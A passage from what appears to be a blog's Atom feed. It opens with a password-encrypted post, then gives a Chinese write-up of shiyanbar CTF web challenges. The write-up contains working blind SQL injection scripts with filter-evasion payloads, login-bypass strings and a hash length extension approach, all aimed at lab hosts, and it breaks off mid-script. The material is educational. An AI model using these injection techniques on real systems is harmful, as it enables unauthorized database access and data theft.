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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chaosec.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Essay" scheme="http://chaosec.top/tags/Essay/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web</title>
    <link href="http://chaosec.top/2018/06/10/%E5%AE%9E%E9%AA%8C%E5%90%A7web/"/>
    <id>http://chaosec.top/2018/06/10/实验吧web/</id>
    <published>2018-06-10T14:48:28.000Z</published>
    <updated>2019-01-30T11:51:11.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目</p><a id="more"></a><h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>打开网页后查看元素发现sql逻辑语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure><p>这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 <code>&#39; or &#39;a</code> 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 <code>ffifdyop</code> ,直接提交一下这个东西，居然正好就是可以。</p><h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys = string.ascii_lowercase + <span class="string">r'!_&#123;&#125;@~,'</span> + string.digits</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_yes = <span class="string">'You are our member'</span></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/baocuo/index.php'</span></span><br><span class="line">payload = <span class="string">"' or (select group_concat(column_name) from information_schema.tables where !(table_schema &lt;&gt; database())) regexp '^&#123;&#125;' and 2&gt;'1"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:<span class="string">'aa'</span>,<span class="string">'password'</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> keys:</span><br><span class="line">tmp = item</span><br><span class="line">data[<span class="string">'password'</span>] = payload.format(flag + tmp)</span><br><span class="line">res = requests.post(url,data=data).text</span><br><span class="line"><span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">flag += tmp</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'database:'</span>,flag)</span><br></pre></td></tr></table></figure><h1 id="认真一点！"><a href="#认真一点！" class="headerlink" title="认真一点！"></a>认真一点！</h1><p>这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了</p><p>直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现<br><code>and,空格，^,union,substr,逗号,%</code>等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合<code>id=0&#39;%0aoorr%0a&#39;or&#39;=&#39;*</code>，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/**/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">keys = string.ascii_lowercase + string.digits + <span class="string">r'!_&#123;&#125;@~.'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_yes = <span class="string">'You are in'</span></span><br><span class="line">url = <span class="string">r'http://ctf5.shiyanbar.com/web/earnest/index.php'</span></span><br><span class="line">payload = <span class="string">"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a"</span> + <span class="string">"'&#123;&#125;$')"</span> + <span class="string">"%0aoorr%0a'b'='a"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_inje</span><span class="params">(payload)</span>:</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">ok = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span> ok:</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> keys:</span><br><span class="line">data[<span class="string">'id'</span>] = parse.unquote(payload.format(item + flag))</span><br><span class="line">res = requests.post(url,data=data).text</span><br><span class="line"><span class="comment"># print(payload.format(item + flag))</span></span><br><span class="line"><span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">flag = item + flag</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> item == <span class="string">'.'</span>:</span><br><span class="line">ok = <span class="keyword">False</span></span><br><span class="line">print(<span class="string">'[+]:'</span>,flag)</span><br><span class="line"><span class="comment"># blind_inje(payload)</span></span><br><span class="line"><span class="comment"># table_name:fiag@users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = "0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a" + "'&#123;&#125;$')" + "%0aoorr%0a'b'='a"</span></span><br><span class="line"><span class="comment"># blind_inje(payload1)</span></span><br><span class="line"><span class="comment"># column_name:fl.4g或者fl$4g</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'&#123;&#125;$')%0aoorr%0a'b'='a"</span></span><br><span class="line">blind_inje(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag:flag&#123;haha~you.win!&#125;注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次</span></span><br><span class="line"><span class="comment"># flag:flag&#123;haha~you win!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h1><p>题目给出了加密代码，直接逆向跑一遍就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$str = <span class="string">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span>;</span><br><span class="line">$str = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">$_c = substr($str, $i, <span class="number">1</span>);</span><br><span class="line">$a = ord($_c);</span><br><span class="line">$b = chr($a<span class="number">-1</span>);</span><br><span class="line">$flag = $flag.$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="登录一下好吗"><a href="#登录一下好吗" class="headerlink" title="登录一下好吗"></a>登录一下好吗</h1><p>先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 <code>uesrname=admin&#39; or 1=1</code>,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;=&apos;&amp;password=&apos;=&apos;</span><br></pre></td></tr></table></figure><p>那么在数据库中就变成了 <code>select * from users where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39;</code> ，所以就成了<code>select * from users where 1 and 1</code> 注意他逻辑运算的时候是一次从前往后运算的。</p><h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url).headers[<span class="string">'FLAG'</span>]</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(response)</span><br><span class="line"></span><br><span class="line">flag = flag.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">flag = flag.split(<span class="string">':'</span>)</span><br><span class="line">flag = flag[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'key'</span>:flag&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url,data=data).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>可以得到flag</p><h1 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h1><p>修改cookie里的source的值为1可以看到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的</p><p><img src="/2018/06/10/实验吧web/1.png" alt="payload"></p><h1 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h1><p>题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/index_3.php'</span></span><br><span class="line">payload = <span class="string">"?id=0' or (substr(database(),&#123;&#125;,1)='&#123;&#125;')%23"</span>  <span class="comment"># database:web1</span></span><br><span class="line">words = string.ascii_lowercase + string.digits + <span class="string">'&#123;&#125;_!~@%^&amp;*-'</span></span><br><span class="line">flag_yes = <span class="string">'Hello'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">payload1 = <span class="string">"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="comment"># table_name: flag@web1</span></span><br><span class="line">payload2 = <span class="string">"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where 